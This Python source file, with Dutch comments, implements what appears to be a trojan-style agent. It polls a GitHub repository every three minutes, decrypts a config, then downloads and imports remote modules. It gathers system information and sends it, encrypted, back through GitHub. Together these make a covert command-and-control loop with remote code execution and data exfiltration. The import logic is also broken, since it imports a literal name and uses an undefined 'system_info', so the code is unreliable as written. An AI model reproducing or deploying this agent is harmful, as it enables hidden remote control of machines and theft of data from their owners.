import time
import requests
import os
from github_connector import GitHubConnector
from encryption import encrypt, decrypt
from modules.system_info import SystemInfoModule

class Agent:
    def __init__(self):
        self.repository_url = "https://raw.githubusercontent.com/ErniedM/agent-framework/main"
        self.github_connector = GitHubConnector(self.repository_url)

    def run(self):
        while True:
            # Check de GitHub repository op updates
            if self.github_connector.check_for_updates():
                # Haal het configuratiebestand op
                config = self.github_connector.get_config()
                decrypted_config = decrypt(config)

                # Voer de acties uit op basis van het configuratiebestand
                self.execute_actions(decrypted_config)

            time.sleep(180)  # Wacht 3 minuten voordat de volgende controle plaatsvindt

    def execute_actions(self, config):
        for action in config:
            module_name = action["module"]
            module_name_without_extension = os.path.splitext(module_name)[0]
            module_url = f"{self.repository_url}/modules/{module_name}"
            module_file_path = os.path.join(os.path.dirname(__file__), module_name)

            # Download de module als bestand
            response = requests.get(module_url)
            if response.status_code == 200:
                with open(module_file_path, "wb") as file:
                    file.write(response.content)
            else:
                print(f"Fout bij het downloaden van module: {module_name}")
                continue

            # Importeer de module en voer de benodigde acties uit
            try:
                import module_name_without_extension
                system_info_module = system_info.SystemInfoModule()
                data = system_info_module.collect_data()
                encrypted_data = encrypt(data)
                self.github_connector.log_data(encrypted_data)
            except ImportError:
                print(f"Fout bij het importeren van module: {module_name}")
            except Exception as e:
                print(f"Fout bij het uitvoeren van module: {module_name}. Foutmelding: {str(e)}")

            # Verwijder het gedownloade modulebestand
            os.remove(module_file_path)

if __name__ == "__main__":
    agent = Agent()
    agent.run()
